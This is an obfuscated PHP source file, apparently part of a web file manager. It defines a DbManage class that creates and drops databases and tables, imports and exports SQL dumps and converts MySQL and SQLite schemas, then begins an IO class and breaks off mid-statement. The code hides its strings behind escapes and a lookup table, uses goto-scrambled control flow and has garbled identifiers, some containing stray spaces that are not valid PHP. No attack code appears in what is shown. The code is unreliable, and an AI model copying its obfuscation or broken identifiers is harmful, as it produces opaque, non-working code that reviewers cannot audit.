<?php
 goto e¡êÎ¨§ó; e›¿öÚ‡º: define($_SERVER[¼èá¯æÙ][327], 2); define($_SERVER[¼èá¯æÙ][328], 3); define($_SERVER[¼èá¯æÙ][329], 1); goto a§ƒÂ÷µ¸­; E¢ÄÖƒ°ÀÊ: class DbManage { function __construct($Çİ®£ü© = array()) { $ÁÁÄ¨“ü =& $_SERVER[¼èá¯æÙ]; if (empty($Çİ®£ü©)) { $Çİ®£ü© = $GLOBALS[$ÁÁÄ¨“ü[6]][$ÁÁÄ¨“ü[21]]; } $this->database = $Çİ®£ü©; } public function model($ŒÔç­éœ = '') { return new ModelBase($ŒÔç­éœ, $_SERVER[¼èá¯æÙ][12], $this->database); } public function db($Ëëâ²¿ = false) { $ùÑÇòŒ° =& $_SERVER[¼èá¯æÙ]; $Ÿˆİ§Õ = array_change_key_case($this->database); if ($this->dbType() == $ùÑÇòŒ°[13] || !$Ëëâ²¿) { return $this->model()->db(); } $îéÕçøº = $Ÿˆİ§Õ[$ùÑÇòŒ°[1054]]; $Ÿˆİ§Õ[$ùÑÇòŒ°[1054]] = $ùÑÇòŒ°[12]; if ($Ÿˆİ§Õ[$ùÑÇòŒ°[1049]] == $ùÑÇòŒ°[1046]) { $µÊº–‰  = $Ÿˆİ§Õ[$ùÑÇòŒ°[1055]]; $Ÿˆİ§Õ[$ùÑÇòŒ°[1055]] = substr($µÊº–‰ , 0, strrpos($µÊº–‰ , $ùÑÇòŒ°[1141])); } $this->database = $Ÿˆİ§Õ; $õ‘ù’ï = $this->model()->db(); try { $÷¢»¨é = $õ‘ù’ï->execute("\x73\150\157\167\40\144\141\x74\x61\142\141\163\x65\163\x20\x6c\x69\x6b\x65\40\x27{$îéÕçøº}\x27"); } catch (Exception $‹û²ºëà) { } if (!$÷¢»¨é) { $õ‘ù’ï->execute("\x63\162\145\141\164\x65\40\144\141\x74\x61\142\x61\x73\145\x20\140{$îéÕçøº}\x60"); } $Ÿˆİ§Õ[$ùÑÇòŒ°[1054]] = $îéÕçøº; if ($Ÿˆİ§Õ[$ùÑÇòŒ°[1049]] == $ùÑÇòŒ°[1046]) { $Ÿˆİ§Õ[$ùÑÇòŒ°[1055]] .= $ùÑÇòŒ°[1141] . $îéÕçøº; } $this->database = $Ÿˆİ§Õ; $õ‘ù’ï->execute("\165\163\x65\x20\140{$îéÕçøº}\140"); return $õ‘ù’ï; } public function createTable($¸ÒéçÕ, &$Âƒşñú) { $•½ìï±Ÿ =& $_SERVER[¼èá¯æÙ]; if (!IO::exist($¸ÒéçÕ)) { ActionCall($•½ìï±Ÿ[1142], !0, 0); show_json(LNG($•½ìï±Ÿ[1143]), !1); } $ùëŸò Î = $this->model()->db(); $Ã×€Ä•× = sqlSplit(IO::getContent($¸ÒéçÕ)); foreach ($Ã×€Ä•× as $—‰âÊôì) { $¥£¯Õï = stripos($—‰âÊôì, $•½ìï±Ÿ[1144]) === 0; if ($¥£¯Õï) { $Âƒşñú->task[$•½ìï±Ÿ[1145]] += 1; } $ùëŸò Î->execute($—‰âÊôì); if ($¥£¯Õï) { preg_match($•½ìï±Ÿ[1146], $—‰âÊôì, $öÉâÈö); $Âƒşñú->task[$•½ìï±Ÿ[1147]] = $öÉâÈö[1]; $Âƒşñú->update(1); } } } public function insertTable($œ³œ”ùµ, &$‚øÀ”œ‰) { $üœ¨¶ùÅ =& $_SERVER[¼èá¯æÙ]; $ãáŒÓİ = $this->model()->db(); $Ğ×ú‚ÃÎ = $ğæÛŸåè ? array($ğæÛŸåè) : $ãáŒÓİ->getTables(); foreach ($œ³œ”ùµ as $‹Ü¬­®) { $ğæÛŸåè = basename($‹Ü¬­®, $üœ¨¶ùÅ[871]); if (!in_array($ğæÛŸåè, $Ğ×ú‚ÃÎ)) { continue; } $‚øÀ”œ‰->task[$üœ¨¶ùÅ[1147]] = $ğæÛŸåè; if (get_filesize($‹Ü¬­®) == 0) { continue; } $Úôáƒ¹ú = $this->sqlToDb($‹Ü¬­®, $‚øÀ”œ‰); if (!$Úôáƒ¹ú) { ActionCall($üœ¨¶ùÅ[1142], !0, 0); show_json(LNG($üœ¨¶ùÅ[1148]) . "\133{$ğæÛŸåè}\135", !1); } } } public function sqlFromDb($«±—şÂç, $ôƒ£ıˆ§, &$£ûË—Ì‹, $ôÄßª˜µ = '') { if ($£ûË—Ì‹) { $£ûË—Ì‹->task[$_SERVER[¼èá¯æÙ][1147]] = $«±—şÂç; } $ÑĞœ¹  = $this->model($«±—şÂç); $ĞÈ´è€ = 0; $‰ê§Ò¶À = 0; $§óã´ªÀ = 10000; $´É¼âÕ” = fopen($ôƒ£ıˆ§, $_SERVER[¼èá¯æÙ][1149]); $†­–§„‰ = $ÑĞœ¹ ->getPk(); $«ÍêˆÁÍ = $ÑĞœ¹ ->getDbFields(); $æÁÂÉ£Ğ = $_SERVER[¼èá¯æÙ][12]; if ($GLOBALS[$_SERVER[¼èá¯æÙ][870]] && in_array($«±—şÂç, array($_SERVER[¼èá¯æÙ][1150], $_SERVER[¼èá¯æÙ][1151]))) { $æÁÂÉ£Ğ = $«±—şÂç; } do { $¨Äú™ÜĞ = array($†­–§„‰ => array($_SERVER[¼èá¯æÙ][1096], $‰ê§Ò¶À)); $¨Ïºİ¿å = $ÑĞœ¹ ->where($¨Äú™ÜĞ)->field($«ÍêˆÁÍ)->order($†­–§„‰ . $_SERVER[¼èá¯æÙ][1152])->limit($§óã´ªÀ)->select(); $¨Ïºİ¿å = !empty($¨Ïºİ¿å) ? $¨Ïºİ¿å : array(); if (!($Ú·ÀÉìì = count($¨Ïºİ¿å))) { break; } $÷À·ğà = end($¨Ïºİ¿å); $‰ê§Ò¶À = $÷À·ğà[$†­–§„‰]; $§ßòŠÉÍ = array(); foreach ($¨Ïºİ¿å as $¯ÒÆêƒƒ) { if ($æÁÂÉ£Ğ) { if ($«±—şÂç == $_SERVER[¼èá¯æÙ][1150]) { if ($¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][33]] == $_SERVER[¼èá¯æÙ][1153]) { $Øö¾Ñ–” = json_decode($¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][462]], !0); if ($Øö¾Ñ–”[$_SERVER[¼èá¯æÙ][32]] == $GLOBALS[$_SERVER[¼èá¯æÙ][870]] && $Øö¾Ñ–”[$_SERVER[¼èá¯æÙ][832]] != 1) { continue; } } } else { if ($¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][33]] == $_SERVER[¼èá¯æÙ][1154] && $¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][107]] == $_SERVER[¼èá¯æÙ][865]) { continue; } } } if ($ôÄßª˜µ) { $¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][97]] = "\x7b\151\x6f\72{$ôÄßª˜µ}\175" . substr($¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][97]], strlen("\173\x69\x6f\72{$¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][900]]}\x7d")); $¯ÒÆêƒƒ[$_SERVER[¼èá¯æÙ][900]] = $ôÄßª˜µ; } $§ßòŠÉÍ[] = $_SERVER[¼èá¯æÙ][1155] . $this->sqlEncode($¯ÒÆêƒƒ) . $_SERVER[¼èá¯æÙ][1156]; } $¢ÑÕÀÕ´ = "\x49\x4e\x53\105\122\124\x20\x49\x4e\124\117\x20\140{$«±—şÂç}\x60\x20\x28\x60" . implode($_SERVER[¼èá¯æÙ][1157], $«ÍêˆÁÍ) . $_SERVER[¼èá¯æÙ][1158]; fwrite($´É¼âÕ”, $¢ÑÕÀÕ´ . implode($_SERVER[¼èá¯æÙ][1159], $§ßòŠÉÍ) . $_SERVER[¼èá¯æÙ][84] . PHP_EOL); $ĞÈ´è€ += $Ú·ÀÉìì; if ($£ûË—Ì‹) { $£ûË—Ì‹->update($Ú·ÀÉìì); } } while ($§óã´ªÀ == $Ú·ÀÉìì); fclose($´É¼âÕ”); return $ĞÈ´è€; } public function sqlToDb($û²¯÷ó“, &$Ñ—Í¶«Š) { $Şœ¬¿®Ÿ =& $_SERVER[¼èá¯æÙ]; $åĞ«°† = $this->model()->db(); $ÇÎéÕìˆ = @fopen($û²¯÷ó“, $Şœ¬¿®Ÿ[1160]); if (!$ÇÎéÕìˆ) { return !1; } $™“Õ·´ƒ = 0; $¸ïÁ†óš = $Şœ¬¿®Ÿ[12]; $óÑâ°é÷ = array(); $Õ’çä–© = $this->dbType(); $èóºü¸ = $Õ’çä–© == $Şœ¬¿®Ÿ[13] ? 500 : 2000; $ìÈ“Èœú = basename($û²¯÷ó“, $Şœ¬¿®Ÿ[871]); $Ûßù¿¶° = 0; $«©Ÿ»…Š = 4194304; while (!feof($ÇÎéÕìˆ)) { $êÒõ“¬Á = trim(fgets($ÇÎéÕìˆ)); if (!$êÒõ“¬Á) { continue; } $Ã…÷îíƒ = $this->sqlDecode($êÒõ“¬Á, $Õ’çä–©, $ìÈ“Èœú); if (stripos($Ã…÷îíƒ, $Şœ¬¿®Ÿ[442]) === 0) { if (!$¸ïÁ†óš) { $¸ïÁ†óš = $Ã…÷îíƒ . $Şœ¬¿®Ÿ[53]; } continue; } if ($Ñ—Í¶«Š) { $Ñ—Í¶«Š->task[$Şœ¬¿®Ÿ[1145]] += 1; } $™“Õ·´ƒ++; $óÑâ°é÷[] = rtrim(rtrim(trim($Ã…÷îíƒ), $Şœ¬¿®Ÿ[50]), $Şœ¬¿®Ÿ[84]); $«äé¿“ñ = null; $ÈæˆÏ¦¾ = strlen($Ã…÷îíƒ); $Ûßù¿¶° += $ÈæˆÏ¦¾; $¸°¡¦Ÿ† = strlen($¸ïÁ†óš) + $Ûßù¿¶° + (count($óÑâ°é÷) - 1); if ($¸°¡¦Ÿ† >= $«©Ÿ»…Š) { $«äé¿“ñ = array_pop($óÑâ°é÷); if ($™“Õ·´ƒ > 1) { $™“Õ·´ƒ--; } } if ($™“Õ·´ƒ >= $èóºü¸ || $«äé¿“ñ) { $Ã…÷îíƒ = $¸ïÁ†óš . implode($Şœ¬¿®Ÿ[50], $óÑâ°é÷); if (!$åĞ«°†->execute($Ã…÷îíƒ)) { return !1; } if ($Ñ—Í¶«Š) { $Ñ—Í¶«Š->update($™“Õ·´ƒ); } $óÑâ°é÷ = array(); $™“Õ·´ƒ = 0; $Ûßù¿¶° = 0; if ($«äé¿“ñ) { $óÑâ°é÷ = array($«äé¿“ñ); $™“Õ·´ƒ = 1; $Ûßù¿¶° = $ÈæˆÏ¦¾; } } } fclose($ÇÎéÕìˆ); if (!empty($óÑâ°é÷)) { $Ã…÷îíƒ = $¸ïÁ†óš . implode($Şœ¬¿®Ÿ[50], $óÑâ°é÷); if (!$åĞ«°†->execute($Ã…÷îíƒ)) { return !1; } if ($Ñ—Í¶«Š) { $Ñ—Í¶«Š->update($™“Õ·´ƒ); } } return !0; } public function dropTable($ÚóÃÇß = null) { $–ç•÷Á„ = $this->model()->db(); $İÏäŞŞ· = $ÚóÃÇß ? array($ÚóÃÇß) : $–ç•÷Á„->getTables(); if (!$İÏäŞŞ·) { return; } foreach ($İÏäŞŞ· as $ÚóÃÇß) { if ($ÚóÃÇß) { $ÚóÃÇß = strtolower($ÚóÃÇß); } else { continue; } $–ç•÷Á„->execute("\144\162\157\x70\40\x74\x61\142\x6c\145\40\x69\x66\x20\x65\x78\x69\x73\164\163\x20\x60{$ÚóÃÇß}\x60"); } } private function sqlEncode($Æ¾šÕè) { $¾îñà»› =& $_SERVER[¼èá¯æÙ]; $¸Øâ•æ× = array(); foreach ($Æ¾šÕè as $œŸ¾ıßÚ) { if (is_array($œŸ¾ıßÚ)) { $œŸ¾ıßÚ = json_encode_force($œŸ¾ıßÚ); } $œŸ¾ıßÚ = addslashes($œŸ¾ıßÚ); $œŸ¾ıßÚ = str_replace(array($¾îñà»›[1161], $¾îñà»›[59], $¾îñà»›[429]), array($¾îñà»›[1162], $¾îñà»›[1163], $¾îñà»›[1164]), $œŸ¾ıßÚ); $¸Øâ•æ×[] = $œŸ¾ıßÚ; } return $¾îñà»›[68] . implode($¾îñà»›[1165], $¸Øâ•æ×) . $¾îñà»›[68]; } private function sqlDecode($µáËÇÓÈ, $ùÜ«Õ‹˜, $ïõÛÍ = '') { $âîŸşÇ =& $_SERVER[¼èá¯æÙ]; $µáËÇÓÈ = str_replace(array($âîŸşÇ[1162], $âîŸşÇ[1163], $âîŸşÇ[1164]), array($âîŸşÇ[1161], $âîŸşÇ[59], $âîŸşÇ[429]), $µáËÇÓÈ); if ($ùÜ«Õ‹˜ == $âîŸşÇ[13]) { $µáËÇÓÈ = str_ireplace($âîŸşÇ[1166], $âîŸşÇ[69], $µáËÇÓÈ); $µáËÇÓÈ = stripslashes($µáËÇÓÈ); } return preg_replace($âîŸşÇ[1167], $âîŸşÇ[12], $µáËÇÓÈ); if ($ùÜ«Õ‹˜ == $âîŸşÇ[13]) { return $ïõÛÍ != $âîŸşÇ[864] ? stripslashes($µáËÇÓÈ) : $µáËÇÓÈ; } if ($ïõÛÍ == $âîŸşÇ[864]) { $µáËÇÓÈ = str_replace($âîŸşÇ[1168], $âîŸşÇ[131], stripslashes($µáËÇÓÈ)); } return $µáËÇÓÈ; } public function getSqlFile($©Î½®è = '') { $©¬ºç­ =& $_SERVER[¼èá¯æÙ]; $‚·ÔÜ§ = $this->dbType(!0); $ı¾”ìºë = CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\154\x2f\144\x61\x74\141\57{$‚·ÔÜ§}\x2e\x73\x71\154"; $®Ö€ÆÔ” = file_get_contents($ı¾”ìºë); $½¦ŠÕß© = $©¬ºç­[1169] . ($‚·ÔÜ§ == $©¬ºç­[887] ? $©¬ºç­[1170] : $©¬ºç­[1171]) . $©¬ºç­[1172]; preg_match_all($½¦ŠÕß©, $®Ö€ÆÔ”, $ŒÖ³ÁÇÉ); $ªìÊ® = $ŒÖ³ÁÇÉ[1]; $¤«©Ø¾Ô = $this->model()->db(); $ÕÑ¢ßğ = $¤«©Ø¾Ô->getTables(); $Ñ•­¿ßª = TEMP_FILES . $©¬ºç­[1173] . date($©¬ºç­[271]) . $©¬ºç­[8]; del_dir($Ñ•­¿ßª); mk_dir($Ñ•­¿ßª); $ôáƒ†î° = $Ñ•­¿ßª . $©¬ºç­[1174]; $¢««éµ = $Ñ•­¿ßª . $©¬ºç­[1175]; $“âƒÉ£è = $‚·ÔÜ§ == $©¬ºç­[13] ? $©¬ºç­[887] : $©¬ºç­[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\141\x6c\154\57\x64\141\164\141\57{$“âƒÉ£è}\56\163\161\x6c", $Ñ•­¿ßª); @touch($Ñ•­¿ßª . $‚·ÔÜ§ . $©¬ºç­[871]); $Ê¯á«ÕŠ = fopen($ôáƒ†î°, $©¬ºç­[1149]); $ç±¦› ² = fopen($¢««éµ, $©¬ºç­[1149]); if ($‚·ÔÜ§ == $©¬ºç­[13]) { $ÕÑ¢ßğ = array_diff($ÕÑ¢ßğ, array($©¬ºç­[862], $©¬ºç­[863])); $åé‘ÒÌµ = array($©¬ºç­[1176], $©¬ºç­[1177], $©¬ºç­[1178]); fwrite($ç±¦› ², implode(PHP_EOL, $åé‘ÒÌµ) . PHP_EOL . PHP_EOL); foreach ($ÕÑ¢ßğ as $ÃŒ…ù’Ö) { $äØñ¤èø = $this->sqlFromSqlite($ÃŒ…ù’Ö); if (!$äØñ¤èø[$©¬ºç­[13]]) { continue; } fwrite($ç±¦› ², $äØñ¤èø[$©¬ºç­[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÃŒ…ù’Ö, $ªìÊ®)) { fwrite($Ê¯á«ÕŠ, $äØñ¤èø[$©¬ºç­[887]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÕÑ¢ßğ as $ÃŒ…ù’Ö) { $äØñ¤èø = $this->sqlFromMysql($ÃŒ…ù’Ö); if (!$äØñ¤èø[$©¬ºç­[887]]) { continue; } fwrite($Ê¯á«ÕŠ, $äØñ¤èø[$©¬ºç­[887]] . PHP_EOL . PHP_EOL); if (!in_array($ÃŒ…ù’Ö, $ªìÊ®)) { fwrite($ç±¦› ², $äØñ¤èø[$©¬ºç­[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ê¯á«ÕŠ); fclose($ç±¦› ²); $®Ö€ÆÔ” = array($©¬ºç­[887] => $ôáƒ†î°, $©¬ºç­[13] => $¢««éµ); return $©Î½®è ? $®Ö€ÆÔ”[$©Î½®è] : $®Ö€ÆÔ”; } public function dbType($ƒÂä–øÙ = false) { $ÚÄµ‘‹ƒ =& $_SERVER[¼èá¯æÙ]; $ìĞ÷Ñûƒ = $ƒÂä–øÙ ? $GLOBALS[$ÚÄµ‘‹ƒ[6]][$ÚÄµ‘‹ƒ[21]] : $this->database; $ìĞ÷Ñûƒ = array_change_key_case($ìĞ÷Ñûƒ); $Û×şŠ˜ = $ìĞ÷Ñûƒ[$ÚÄµ‘‹ƒ[1049]]; if ($Û×şŠ˜ == $ÚÄµ‘‹ƒ[1046]) { $àî¥‡¼« = explode($ÚÄµ‘‹ƒ[4], $ìĞ÷Ñûƒ[$ÚÄµ‘‹ƒ[1055]]); $Û×şŠ˜ = $àî¥‡¼«[0]; } $ˆ´°’»Æ = array($ÚÄµ‘‹ƒ[1179] => $ÚÄµ‘‹ƒ[13], $ÚÄµ‘‹ƒ[994] => $ÚÄµ‘‹ƒ[887]); if (isset($ˆ´°’»Æ[$Û×şŠ˜])) { $Û×şŠ˜ = $ˆ´°’»Æ[$Û×şŠ˜]; } return $Û×şŠ˜; } public function sqlFromMysql($©°òü…µ, $ñ§²¼Ç‘ = '') { $”Æ÷øõì =& $_SERVER[¼èá¯æÙ]; $äÂ…™Ø£ = $this->model()->db(); $ÎÙóËú» = $äÂ…™Ø£->query($”Æ÷øõì[1180] . $©°òü…µ . $”Æ÷øõì[472]); if (!$ÎÙóËú» || !$ÎÙóËú»[0]) { return !1; } $«•åĞ = _get($ÎÙóËú»[0], $”Æ÷øõì[1181], $”Æ÷øõì[12]); if (!$«•åĞ) { return !1; } $ã©œŠ„ê = "\104\122\x4f\120\x20\x54\x41\102\114\105\x20\111\x46\40\105\x58\x49\123\124\123\x20\x60{$©°òü…µ}\x60\73" . PHP_EOL . $«•åĞ . $”Æ÷øõì[84]; if ($ñ§²¼Ç‘ && $ñ§²¼Ç‘ == $”Æ÷øõì[887]) { return $ã©œŠ„ê; } $™íóŒ×ì = array_change_key_case($GLOBALS[$”Æ÷øõì[6]][$”Æ÷øõì[21]]); $©ÒâêÂ¢ = $™íóŒ×ì[$”Æ÷øõì[1054]]; $ÊÕÙÛŸÖ = $”Æ÷øõì[1182] . $©ÒâêÂ¢ . $”Æ÷øõì[1183] . $©°òü…µ . $”Æ÷øõì[68]; $‰ÚÍıÅ = $”Æ÷øõì[1184] . $©°òü…µ . $”Æ÷øõì[982]; $¸¦öéóÑ = $äÂ…™Ø£->query($ÊÕÙÛŸÖ); if (empty($¸¦öéóÑ)) { $³ƒ¼ûšÔ = array($”Æ÷øõì[887] => $”Æ÷øõì[12], $”Æ÷øõì[13] => $”Æ÷øõì[12]); return $ñ§²¼Ç‘ ? $³ƒ¼ûšÔ[$ñ§²¼Ç‘] : $³ƒ¼ûšÔ; } $¯ß“ÆŞ© = $äÂ…™Ø£->query($‰ÚÍıÅ); $Ó©Ò—ÍŸ = $”Æ÷øõì[12]; $¯¿ğ¤¸· = array(); foreach ($¯ß“ÆŞ© as $øĞ‘Áƒ®) { if (!$Ó©Ò—ÍŸ && $øĞ‘Áƒ®[$”Æ÷øõì[1185]] == $”Æ÷øõì[1186]) { $Ó©Ò—ÍŸ = $øĞ‘Áƒ®[$”Æ÷øõì[1187]]; } if (isset($¯¿ğ¤¸·[$øĞ‘Áƒ®[$”Æ÷øõì[1185]]])) { $¯¿ğ¤¸·[$øĞ‘Áƒ®[$”Æ÷øõì[1185]]][$”Æ÷øõì[1188]][] = $øĞ‘Áƒ®[$”Æ÷øõì[1187]]; continue; } $¯¿ğ¤¸·[$øĞ‘Áƒ®[$”Æ÷øõì[1185]]] = array($”Æ÷øõì[1189] => $øĞ‘Áƒ®[$”Æ÷øõì[1185]], $”Æ÷øõì[1188] => array($øĞ‘Áƒ®[$”Æ÷øõì[1187]]), $”Æ÷øõì[1190] => $øĞ‘Áƒ®[$”Æ÷øõì[1191]] == $”Æ÷øõì[101] ? 0 : 1); } $¤Ø••¤‘ = array(); foreach ($¯¿ğ¤¸· as $øĞ‘Áƒ®) { $ı•×öœ† = $øĞ‘Áƒ®[$”Æ÷øõì[1189]] == $”Æ÷øõì[1186]; $ÈÛ°ãŞå = array($”Æ÷øõì[1192], $øĞ‘Áƒ®[$”Æ÷øõì[1190]] == $”Æ÷øõì[101] && !$ı•×öœ† ? $”Æ÷øõì[1193] : $”Æ÷øõì[12], $”Æ÷øõì[1194], $”Æ÷øõì[1195] . $©°òü…µ . $”Æ÷øõì[11] . ($ı•×öœ† ? $”Æ÷øõì[1196] : $øĞ‘Áƒ®[$”Æ÷øõì[1189]]) . $”Æ÷øõì[131], $”Æ÷øõì[1197], $”Æ÷øõì[131] . $©°òü…µ . $”Æ÷øõì[131], $”Æ÷øõì[1198] . implode($”Æ÷øõì[1199], $øĞ‘Áƒ®[$”Æ÷øõì[1188]]) . $”Æ÷øõì[1200]); $¤Ø••¤‘[] = implode($”Æ÷øõì[53], $ÈÛ°ãŞå) . $”Æ÷øõì[84]; } $Ëâòõ®¿ = array(); $õíÜêÈ = array($”Æ÷øõì[1201] => $”Æ÷øõì[1202], $”Æ÷øõì[1202] => $”Æ÷øõì[1202], $”Æ÷øõì[375] => $”Æ÷øõì[402], $”Æ÷øõì[374] => $”Æ÷øõì[402]); foreach ($¸¦öéóÑ as $øĞ‘Áƒ®) { $ÈÛ°ãŞå = array($”Æ÷øõì[131] . $øĞ‘Áƒ®[$”Æ÷øõì[1203]] . $”Æ÷øõì[131], isset($õíÜêÈ[$øĞ‘Áƒ®[$”Æ÷øõì[1204]]]) ? $õíÜêÈ[$øĞ‘Áƒ®[$”Æ÷øõì[1204]]] : $øĞ‘Áƒ®[$”Æ÷øõì[1205]], $øĞ‘Áƒ®[$”Æ÷øõì[1206]] == $”Æ÷øõì[980] ? $”Æ÷øõì[1207] : $”Æ÷øõì[1208], $øĞ‘Áƒ®[$”Æ÷øõì[1203]] == $Ó©Ò—ÍŸ ? $”Æ÷øõì[1209] : $”Æ÷øõì[12], $øĞ‘Áƒ®[$”Æ÷øõì[1031]] ? strtoupper(str_replace($”Æ÷øõì[11], $”Æ÷øõì[12], $øĞ‘Áƒ®[$”Æ÷øõì[1031]])) : $”Æ÷øõì[12]); $Ëâòõ®¿[] = trim(implode($”Æ÷øõì[53], $ÈÛ°ãŞå)); } $ÁáµâÆ« = array($”Æ÷øõì[1210] . $©°òü…µ . $”Æ÷øõì[1211], $”Æ÷øõì[1212] . $©°òü…µ . $”Æ÷øõì[1213], implode($”Æ÷øõì[50] . PHP_EOL, $Ëâòõ®¿), $”Æ÷øõì[1028]); $Òä­Êƒ = implode(PHP_EOL, array_merge($ÁáµâÆ«, $¤Ø••¤‘)); if ($ñ§²¼Ç‘ && $ñ§²¼Ç‘ == $”Æ÷øõì[13]) { return $Òä­Êƒ; } $³ƒ¼ûšÔ = array($”Æ÷øõì[887] => $ã©œŠ„ê, $”Æ÷øõì[13] => $Òä­Êƒ); return $ñ§²¼Ç‘ ? $³ƒ¼ûšÔ[$ñ§²¼Ç‘] : $³ƒ¼ûšÔ; } public function sqlFromSqlite($‚Ÿ¿ÚÙ®, $¦£¿Æé¹ = '') { $ûâ…èšò =& $_SERVER[¼èá¯æÙ]; $´è¬Í« = $this->model()->db(); $öµüšûÑ = "\120\x52\x41\x47\115\101\x20\124\101\102\x4c\x45\x5f\x49\116\106\117\x20\50\x27{$‚Ÿ¿ÚÙ®}\47\x29"; $øöô™Î± = "\x53\x45\x4c\105\103\x54\40\x2a\40\x46\x52\x4f\115\x20\x73\161\154\x69\x74\x65\x5f\155\141\x73\164\145\x72\40\127\110\105\122\105\40\x74\x62\x6c\x5f\156\x61\x6d\x65\x20\75\40\47{$‚Ÿ¿ÚÙ®}\47"; $ÃÎ¡‡Ìı = $´è¬Í«->query($öµüšûÑ); if (empty($ÃÎ¡‡Ìı)) { $Œğ¢èòŒ = array($ûâ…èšò[887] => $ûâ…èšò[12], $ûâ…èšò[13] => $ûâ…èšò[12]); return $¦£¿Æé¹ ? $Œğ¢èòŒ[$¦£¿Æé¹] : $Œğ¢èòŒ; } $öŸÆ“ = $´è¬Í«->query($øöô™Î±); $õ¨ƒ’Ú• = $Şá‰ªøÏ = array(); foreach ($öŸÆ“ as $ËÕƒÄò—) { if ($ËÕƒÄò—[$ûâ…èšò[33]] == $ûâ…èšò[368]) { $õ¨ƒ’Ú•[] = $ËÕƒÄò—[$ûâ…èšò[1214]]; } else { $Şá‰ªøÏ[$ËÕƒÄò—[$ûâ…èšò[32]]] = $ËÕƒÄò—[$ûâ…èšò[1214]]; } } $û­ˆ¶òÃ = array_merge(array($ûâ…èšò[1210] . $‚Ÿ¿ÚÙ® . $ûâ…èšò[131]), $õ¨ƒ’Ú•, array_values($Şá‰ªøÏ)); $û­ˆ¶òÃ = implode($ûâ…èšò[84] . PHP_EOL, $û­ˆ¶òÃ) . $ûâ…èšò[84]; if ($¦£¿Æé¹ && $¦£¿Æé¹ == $ûâ…èšò[13]) { return $û­ˆ¶òÃ; } $ØÛ¡¥ñÓ = array(); foreach ($Şá‰ªøÏ as $»œ„ƒ§ => $¼­ÄŠ) { $—Á Êñ = str_replace($ûâ…èšò[1215] . $‚Ÿ¿ÚÙ® . $ûâ…èšò[11], $ûâ…èšò[12], $»œ„ƒ§); $—Á Êñ = str_replace($‚Ÿ¿ÚÙ® . $ûâ…èšò[11], $ûâ…èšò[12], $»œ„ƒ§); $¾…«şÇ = str_replace(array($ûâ…èšò[131], $ûâ…èšò[1039]), $ûâ…èšò[472], substr($¼­ÄŠ, stripos($¼­ÄŠ, $ûâ…èšò[349]))); $ØÛ¡¥ñÓ[$—Á Êñ] = $¾…«şÇ; } $Üš•š = array(); $Õ¸Ñ­Õ = array($ûâ…èšò[1202] => $ûâ…èšò[1216], $ûâ…èšò[402] => $ûâ…èšò[1217]); $ß–Ä»¼ö = $®·Ÿßó = $ûâ…èšò[12]; foreach ($ÃÎ¡‡Ìı as $ËÕƒÄò—) { if ($ËÕƒÄò—[$ûâ…èšò[67]] == $ûâ…èšò[101]) { $ß–Ä»¼ö = $ËÕƒÄò—[$ûâ…èšò[32]]; } $êÆğÜÚ = $ËÕƒÄò—[$ûâ…èšò[33]]; if ($êÆğÜÚ == $ûâ…èšò[1218] && isset($ØÛ¡¥ñÓ[$ËÕƒÄò—[$ûâ…èšò[32]]])) { $êÆğÜÚ = $ûâ…èšò[1219]; } $›äĞ¿ Î = array($ûâ…èšò[472] . $ËÕƒÄò—[$ûâ…èšò[32]] . $ûâ…èšò[472], _get($Õ¸Ñ­Õ, $êÆğÜÚ, $êÆğÜÚ), $ËÕƒÄò—[$ûâ…èšò[35]] == $ûâ…èšò[101] ? $ûâ…èšò[1207] : $ûâ…èšò[1220] . $ËÕƒÄò—[$ûâ…èšò[66]], $ËÕƒÄò—[$ûâ…èšò[67]] == $ûâ…èšò[101] ? $ûâ…èšò[1221] : $ûâ…èšò[12]); $Üš•š[] = trim(implode($ûâ…èšò[53], $›äĞ¿ Î)); } foreach ($ØÛ¡¥ñÓ as $—Á Êñ => $¾…«şÇ) { if ($—Á Êñ == $ûâ…èšò[1196]) { $Ÿƒ‡²×ˆ = $®·Ÿßó = $ûâ…èšò[1222] . $ß–Ä»¼ö . $ûâ…èšò[1223]; } else { $Ÿƒ‡²×ˆ = (stripos($—Á Êñ, $ûâ…èšò[11]) ? $ûâ…èšò[1224] : $ûâ…èšò[12]) . ($ûâ…èšò[1225] . $—Á Êñ . $ûâ…èšò[1226] . $¾…«şÇ); } $Üš•š[] = $Ÿƒ‡²×ˆ; } if ($ß–Ä»¼ö && !$®·Ÿßó) { $Üš•š = array_merge(array($ûâ…èšò[1222] . $ß–Ä»¼ö . $ûâ…èšò[1223]), $Üš•š); } $¹¢·ï ‡ = array($ûâ…èšò[1227] . $‚Ÿ¿ÚÙ® . $ûâ…èšò[1228], $ûâ…èšò[1229] . $‚Ÿ¿ÚÙ® . $ûâ…èšò[1230], implode($ûâ…èšò[50] . PHP_EOL, $Üš•š), $ûâ…èšò[1231]); $‘ıŞ¶ = implode(PHP_EOL, $¹¢·ï ‡); if ($¦£¿Æé¹ && $¦£¿Æé¹ == $ûâ…èšò[887]) { return $‘ıŞ¶; } $Œğ¢èòŒ = array($ûâ…èšò[887] => $‘ıŞ¶, $ûâ…èšò[13] => $û­ˆ¶òÃ); return $¦£¿Æé¹ ? $Œğ¢èòŒ[$¦£¿Æé¹] : $Œğ¢èòŒ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¶ßïî¶Î, $ÕóøÂƒ—) { $òêİÇ® =& $_SERVER[¼èá¯æÙ]; $Ï³¦“Àä = $ÕóøÂƒ—; $GLOBALS[$òêİÇ®[1232]] = $òêİÇ®[1233] . $¶ßïî¶Î; Hook::trigger($òêİÇ®[1233] . $¶ßïî¶Î . $òêİÇ®[1234], $Ï³¦“Àä); $È“©é» = self::driverMake($ÕóøÂƒ—[0]); if (!$È“©é») { return !1; } if (method_exists($È“©é», $¶ßïî¶Î)) { $èí×‚Ø¤ = @call_user_func_array(array($È“©é», $¶ßïî¶Î), $ÕóøÂƒ—); } else { if (method_exists($È“©é», $òêİÇ®[1235])) { $èí×‚Ø¤ = 